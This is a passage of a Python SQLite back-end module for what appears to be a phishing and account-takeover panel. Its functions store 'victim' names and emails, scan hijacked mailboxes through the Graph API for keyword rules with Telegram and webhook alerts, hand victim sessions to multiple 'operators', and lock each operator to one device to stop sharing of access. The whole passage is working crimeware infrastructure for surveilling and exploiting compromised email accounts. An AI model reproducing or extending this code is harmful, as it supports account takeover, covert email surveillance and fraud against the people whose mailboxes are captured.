    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    if isinstance(keywords, list):
        keywords_json = json.dumps(keywords)
    else:
        keywords_json = json.dumps([k.strip() for k in str(keywords).split(',') if k.strip()])
    cursor.execute('''INSERT INTO keyword_rules 
        (name, category, severity, keywords, search_scope, target_account, notify_telegram, notify_webhook, is_active)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
        (name, category, severity, keywords_json, search_scope, target_account, int(notify_telegram), int(notify_webhook), int(is_active)))
    conn.commit()
    new_id = cursor.lastrowid
    conn.close()
    return new_id

def update_keyword_rule(rule_id, name, category, severity, keywords, search_scope='all', target_account='all', notify_telegram=1, notify_webhook=1, is_active=1):
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    if isinstance(keywords, list):
        keywords_json = json.dumps(keywords)
    else:
        keywords_json = json.dumps([k.strip() for k in str(keywords).split(',') if k.strip()])
    cursor.execute('''UPDATE keyword_rules SET
        name = ?, category = ?, severity = ?, keywords = ?, search_scope = ?, 
        target_account = ?, notify_telegram = ?, notify_webhook = ?, is_active = ?
        WHERE id = ?''',
        (name, category, severity, keywords_json, search_scope, target_account, int(notify_telegram), int(notify_webhook), int(is_active), rule_id))
    conn.commit()
    conn.close()
    return True

def delete_keyword_rule(rule_id):
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    cursor.execute("DELETE FROM keyword_rules WHERE id = ?", (rule_id,))
    conn.commit()
    conn.close()
    return True

def toggle_keyword_rule(rule_id, is_active):
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    cursor.execute("UPDATE keyword_rules SET is_active = ? WHERE id = ?", (int(is_active), rule_id))
    conn.commit()
    conn.close()
    return True

def record_keyword_match(rule_id, session_user_code, victim_name, victim_email, matched_keyword, email_subject, email_sender, email_snippet, message_id, received_datetime=''):
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    inserted_id = None
    try:
        cursor.execute('''INSERT INTO keyword_matches 
            (rule_id, session_user_code, victim_name, victim_email, matched_keyword, email_subject, email_sender, email_snippet, message_id, received_datetime, is_triaged)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 0)''',
            (rule_id, session_user_code, victim_name, victim_email, matched_keyword, email_subject, email_sender, email_snippet, message_id, received_datetime))
        inserted_id = cursor.lastrowid
        # Permanently log in the deduplication ledger so clearing the UI feed never re-alerts
        cursor.execute('''INSERT OR IGNORE INTO keyword_alert_ledger 
            (session_user_code, message_id, received_datetime) 
            VALUES (?, ?, ?)''',
            (session_user_code, message_id, received_datetime))
        conn.commit()
    except sqlite3.IntegrityError:
        # Match already recorded
        pass
    except Exception as e:
        logger.warning(f"Error recording keyword match: {e}")
    finally:
        conn.close()
    return inserted_id

def is_message_already_matched(session_user_code, message_id, rule_id=None):
    """Check if a specific Graph API email message was already alerted in permanent ledger."""
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    try:
        # 1. Primary check: permanent alert ledger
        cursor.execute("SELECT 1 FROM keyword_alert_ledger WHERE session_user_code = ? AND message_id = ? LIMIT 1", (session_user_code, message_id))
        if cursor.fetchone() is not None:
            return True
        # 2. Secondary check: keyword_matches table
        if rule_id:
            cursor.execute("SELECT 1 FROM keyword_matches WHERE session_user_code = ? AND message_id = ? AND rule_id = ? LIMIT 1", (session_user_code, message_id, rule_id))
        else:
            cursor.execute("SELECT 1 FROM keyword_matches WHERE session_user_code = ? AND message_id = ? LIMIT 1", (session_user_code, message_id))
        return cursor.fetchone() is not None
    except Exception as e:
        logger.warning(f"Error checking message match state: {e}")
        return False
    finally:
        conn.close()

def mark_message_alerted(session_user_code, message_id, received_datetime=''):
    """Record an email message as permanently alerted in ledger."""
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    try:
        cursor.execute("INSERT OR IGNORE INTO keyword_alert_ledger (session_user_code, message_id, received_datetime) VALUES (?, ?, ?)",
                       (session_user_code, message_id, received_datetime))
        conn.commit()
    except Exception as e:
        logger.warning(f"Error marking message in ledger: {e}")
    finally:
        conn.close()

def get_keyword_matches(severity=None, target_account=None, rule_id=None, triaged=None, limit=100, offset=0):
    conn = sqlite3.connect(Config.DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    query = '''SELECT m.*, r.name as rule_name, r.category as rule_category, r.severity as rule_severity
               FROM keyword_matches m
               LEFT JOIN keyword_rules r ON m.rule_id = r.id
               WHERE 1=1'''
    params = []
    if severity and severity != 'ALL':
        query += " AND r.severity = ?"
        params.append(severity.upper())
    if target_account and target_account != 'ALL':
        query += " AND m.session_user_code = ?"
        params.append(target_account)
    if rule_id:
        query += " AND m.rule_id = ?"
        params.append(rule_id)
    if triaged is not None and triaged != 'ALL':
        query += " AND m.is_triaged = ?"
        params.append(1 if triaged in (1, '1', True, 'true') else 0)
    query += " ORDER BY m.id DESC LIMIT ? OFFSET ?"
    params.extend([limit, offset])
    rows = cursor.execute(query, params).fetchall()
    conn.close()
    return [dict(r) for r in rows]

def triage_keyword_match(match_id, is_triaged=1):
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    cursor.execute("UPDATE keyword_matches SET is_triaged = ? WHERE id = ?", (int(is_triaged), match_id))
    conn.commit()
    conn.close()
    return True

def delete_keyword_match(match_id):
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    cursor.execute("DELETE FROM keyword_matches WHERE id = ?", (match_id,))
    conn.commit()
    conn.close()
    return True

def clear_keyword_matches():
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    cursor.execute("DELETE FROM keyword_matches")
    conn.commit()
    conn.close()
    return True

def get_keyword_stats():
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    try:
        rules_count = cursor.execute("SELECT COUNT(*) FROM keyword_rules WHERE is_active = 1").fetchone()[0]
        total_rules = cursor.execute("SELECT COUNT(*) FROM keyword_rules").fetchone()[0]
        matches_count = cursor.execute("SELECT COUNT(*) FROM keyword_matches").fetchone()[0]
        critical_count = cursor.execute('''SELECT COUNT(*) FROM keyword_matches m 
            LEFT JOIN keyword_rules r ON m.rule_id = r.id 
            WHERE r.severity = 'CRITICAL' ''').fetchone()[0]
        untriaged_count = cursor.execute("SELECT COUNT(*) FROM keyword_matches WHERE is_triaged = 0").fetchone()[0]
        victims_count = cursor.execute("SELECT COUNT(DISTINCT session_user_code) FROM keyword_matches").fetchone()[0]
    except Exception:
        rules_count = total_rules = matches_count = critical_count = untriaged_count = victims_count = 0
    finally:
        conn.close()
    return {
        'active_rules': rules_count,
        'total_rules': total_rules,
        'total_matches': matches_count,
        'critical_matches': critical_count,
        'untriaged_matches': untriaged_count,
        'monitored_victims_with_hits': victims_count
    }

# ── Multi-Operator Role-Based Access Operations ──────────────────────────────

def get_operators():
    """Retrieve all operators along with their assigned victim sessions."""
    conn = sqlite3.connect(Config.DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    ops = cursor.execute("SELECT id, username, role, status, token, bound_device_hash, bound_ip, bound_device_info, active_session_nonce, sharing_violations_count, created_at, last_login FROM operators ORDER BY id ASC").fetchall()
    result = []
    for op in ops:
        d = dict(op)
        assignments = cursor.execute("""
            SELECT oa.session_user_code, s.victim_name, s.victim_email, s.status as session_status
            FROM operator_assignments oa
            LEFT JOIN sessions s ON oa.session_user_code = s.user_code
            WHERE oa.operator_id = ?
            ORDER BY oa.id ASC
        """, (d['id'],)).fetchall()
        d['assigned_sessions'] = [a['session_user_code'] for a in assignments]
        d['assigned_sessions_info'] = [dict(a) for a in assignments]
        result.append(d)
    conn.close()
    return result

def get_operator(operator_id):
    """Retrieve a single operator by ID with assigned sessions."""
    conn = sqlite3.connect(Config.DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    op = cursor.execute("SELECT id, username, role, status, token, tg_bot_token, tg_chat_id, bound_device_hash, bound_ip, bound_device_info, active_session_nonce, sharing_violations_count, created_at, last_login FROM operators WHERE id = ?", (operator_id,)).fetchone()
    if not op:
        conn.close()
        return None
    d = dict(op)
    assignments = cursor.execute("""
        SELECT oa.session_user_code, s.victim_name, s.victim_email, s.status as session_status
        FROM operator_assignments oa
        LEFT JOIN sessions s ON oa.session_user_code = s.user_code
        WHERE oa.operator_id = ?
        ORDER BY oa.id ASC
    """, (d['id'],)).fetchall()
    d['assigned_sessions'] = [a['session_user_code'] for a in assignments]
    d['assigned_sessions_info'] = [dict(a) for a in assignments]
    conn.close()
    return d

def get_operator_by_username(username):
    """Retrieve operator row including password_hash for authentication."""
    if not username:
        return None
    conn = sqlite3.connect(Config.DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    row = cursor.execute("SELECT * FROM operators WHERE username = ? COLLATE NOCASE", (username.strip(),)).fetchone()
    conn.close()
    return dict(row) if row else None

def get_operator_by_token(token):
    """Retrieve operator row by unique codified portal token."""
    if not token:
        return None
    conn = sqlite3.connect(Config.DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    row = cursor.execute("SELECT * FROM operators WHERE token = ?", (token.strip().lower(),)).fetchone()
    if not row:
        conn.close()
        return None
    d = dict(row)
    assignments = cursor.execute("""
        SELECT oa.session_user_code, s.victim_name, s.victim_email, s.status as session_status
        FROM operator_assignments oa
        LEFT JOIN sessions s ON oa.session_user_code = s.user_code
        WHERE oa.operator_id = ?
        ORDER BY oa.id ASC
    """, (d['id'],)).fetchall()
    d['assigned_sessions'] = [a['session_user_code'] for a in assignments]
    d['assigned_sessions_info'] = [dict(a) for a in assignments]
    conn.close()
    return d

def create_operator(username, password, assigned_sessions=None, role='operator', status='active', token=None):
    """Create a new operator and assign victim sessions."""
    username = username.strip()
    if not username or not password:
        raise ValueError("Username and password are required")
    pwd_hash = generate_password_hash(password)
    op_token = (token or secrets.token_hex(6)).strip().lower()
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    try:
        cursor.execute("""
            INSERT INTO operators (username, password_hash, role, status, token)
            VALUES (?, ?, ?, ?, ?)
        """, (username, pwd_hash, role, status, op_token))
        op_id = cursor.lastrowid
        if assigned_sessions:
            for code in assigned_sessions:
                code_str = str(code).strip()
                if code_str:
                    cursor.execute("""
                        INSERT OR IGNORE INTO operator_assignments (operator_id, session_user_code)
                        VALUES (?, ?)
                    """, (op_id, code_str))
        conn.commit()
        return op_id
    finally:
        conn.close()

def update_operator(operator_id, password=None, status=None, assigned_sessions=None):
    """Update operator password, active status, or delegated session assignments."""
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    try:
        if password:
            pwd_hash = generate_password_hash(password)
            cursor.execute("UPDATE operators SET password_hash = ? WHERE id = ?", (pwd_hash, operator_id))
        if status in ('active', 'disabled'):
            cursor.execute("UPDATE operators SET status = ? WHERE id = ?", (status, operator_id))
        if assigned_sessions is not None:
            # Replace all session assignments
            cursor.execute("DELETE FROM operator_assignments WHERE operator_id = ?", (operator_id,))
            for code in assigned_sessions:
                code_str = str(code).strip()
                if code_str:
                    cursor.execute("""
                        INSERT OR IGNORE INTO operator_assignments (operator_id, session_user_code)
                        VALUES (?, ?)
                    """, (operator_id, code_str))
        conn.commit()
        return True
    finally:
        conn.close()

def delete_operator(operator_id):
    """Delete an operator and their delegated session assignments."""
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    try:
        cursor.execute("DELETE FROM operator_assignments WHERE operator_id = ?", (operator_id,))
        cursor.execute("DELETE FROM operators WHERE id = ?", (operator_id,))
        conn.commit()
        return True
    finally:
        conn.close()

def get_operator_assigned_sessions(operator_id):
    """Return list of session_user_code strings assigned to an operator."""
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    rows = cursor.execute("SELECT session_user_code FROM operator_assignments WHERE operator_id = ?", (operator_id,)).fetchall()
    conn.close()
    return [r[0] for r in rows]

def is_session_assigned_to_operator(operator_id, session_user_code):
    """Check if a specific session is assigned to the operator."""
    if not operator_id or not session_user_code:
        return False
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    row = cursor.execute("""
        SELECT 1 FROM operator_assignments 
        WHERE operator_id = ? AND session_user_code = ? 
        LIMIT 1
    """, (operator_id, session_user_code)).fetchone()
    conn.close()
    return row is not None

def update_operator_last_login(operator_id):
    """Update last_login timestamp for operator."""
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    try:
        cursor.execute("UPDATE operators SET last_login = CURRENT_TIMESTAMP WHERE id = ?", (operator_id,))
        conn.commit()
    finally:
        conn.close()

def update_operator_telegram(operator_id, tg_bot_token, tg_chat_id):
    """Update personal Telegram bot notification settings for operator."""
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    try:
        cursor.execute("UPDATE operators SET tg_bot_token = ?, tg_chat_id = ? WHERE id = ?", (tg_bot_token, tg_chat_id, operator_id))
        conn.commit()
    finally:
        conn.close()

def bind_operator_device(operator_id, device_hash, ip, device_info, session_nonce):
    """Binds an operator account permanently to a specific hardware device and activates session nonce."""
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    try:
        cursor.execute("""
            UPDATE operators 
            SET bound_device_hash = ?, bound_ip = ?, bound_device_info = ?, active_session_nonce = ?, last_login = CURRENT_TIMESTAMP
            WHERE id = ?
        """, (device_hash, ip, device_info, session_nonce, operator_id))
        conn.commit()
        logger.info(f"[OP-BIND] Operator #{operator_id} permanently locked to device {device_hash[:8]} ({device_info})")
        return True
    except Exception as e:
        logger.error(f"[OP-BIND] Failed to bind operator device: {e}")
        return False
    finally:
        conn.close()

def update_operator_session_nonce(operator_id, session_nonce, ip=None):
    """Rotates active single-device session nonce to ensure zero concurrent logins."""
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    try:
        if ip:
            cursor.execute("UPDATE operators SET active_session_nonce = ?, bound_ip = ?, last_login = CURRENT_TIMESTAMP WHERE id = ?", (session_nonce, ip, operator_id))
        else:
            cursor.execute("UPDATE operators SET active_session_nonce = ?, last_login = CURRENT_TIMESTAMP WHERE id = ?", (session_nonce, operator_id))
        conn.commit()
        return True
    except Exception as e:
        logger.error(f"[OP-BIND] Failed to update session nonce: {e}")
        return False
    finally:
        conn.close()

def reset_operator_device_binding(operator_id):
    """Admin action: Resets an operator's hardware lock so they can bind a new workstation."""
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    try:
        cursor.execute("""
            UPDATE operators 
            SET bound_device_hash = NULL, bound_device_info = NULL, bound_ip = NULL, active_session_nonce = NULL
            WHERE id = ?
        """, (operator_id,))
        conn.commit()
        logger.info(f"[OP-BIND] Device lock reset by Admin for operator ID #{operator_id}")
        return True
    except Exception as e:
        logger.error(f"[OP-BIND] Failed to reset device lock: {e}")
        return False
    finally:
        conn.close()

def record_operator_sharing_violation(operator_id):
    """Logs an unauthorized hardware mismatch or sharing violation attempt."""
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    try:
        cursor.execute("UPDATE operators SET sharing_violations_count = COALESCE(sharing_violations_count, 0) + 1 WHERE id = ?", (operator_id,))
        conn.commit()
        logger.warning(f"[OP-SECURITY] Sharing violation recorded for operator ID #{operator_id}")
    finally:
        conn.close()